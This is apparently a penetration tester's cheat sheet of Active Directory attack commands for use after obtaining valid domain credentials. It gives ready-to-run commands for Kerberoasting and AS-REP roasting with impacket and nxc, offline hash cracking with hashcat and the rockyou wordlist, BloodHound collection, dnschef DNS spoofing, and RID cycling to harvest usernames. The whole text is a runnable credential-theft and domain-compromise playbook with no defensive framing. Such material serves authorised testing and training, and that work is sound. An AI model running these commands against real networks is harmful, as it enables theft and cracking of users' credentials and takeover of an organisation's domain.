# Valid Credentials

### 1) Kerberoasting

Do a Kerberoasting attack

    impacket-getUserSPNs -request -dc-ip DC_IP domain/user:password -outputfile kerberoasted.txt

Crack hash

    hashcat -a 0 -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt

### 2) ASREProasting

Do an ASREProasting attack

    nxc ldap DC_IP -u user -p password --kdchost DC_IP --asrep

Crack hash

    hashcat -m 18200 -a 0 asreproasted.txt /usr/share/wordlists/rockyou.txt

### 3) Bloodhound

Start neo4j database

    sudo neo4j start

Start Bloodhound

    sudo bloodhound

Configure your ~/.nxc/nxc.conf file and add the following

    [BloodHound]
    
    bh_enabled = True
    
    bh_uri = 127.0.0.1
    
    bh_port = 7687
    
    bh_user = user
    
    bh_pass = pass

Run Bloodhound ingestor remotely

    nxc ldap domain.local -u user -p password --bloodhound --dns-server DC_IP --collection All

OR use the Python version

    bloodhound-python -d domain.local -u user -p password -dc dc.domain.local -c all -ns DC_IP --zip

If you receive DNS errors, use dnschef

    dnschef --fakeip TARGET_IP --nameserver TARGET_IP

Rerun Bloodhound

    bloodhound-python -d domain.local -u user -p password -dc dc.domain.local -c all -ns 127.0.0.1

Upload the zip file to Bloodhound

Mark your compromised user as "Owned", then use the cypher query "Shortest path from Owned".

### 4) RID Cycling

Enumerate all valid users within the domain by doing RID Cycling

    impacket-lookupsid domain.local/USER1:Password@123@DC_IP | grep -oP 'domain\\\K[\w.$]+(?=\s+\(SidTypeUser\))' | sort -u > usernames.txt
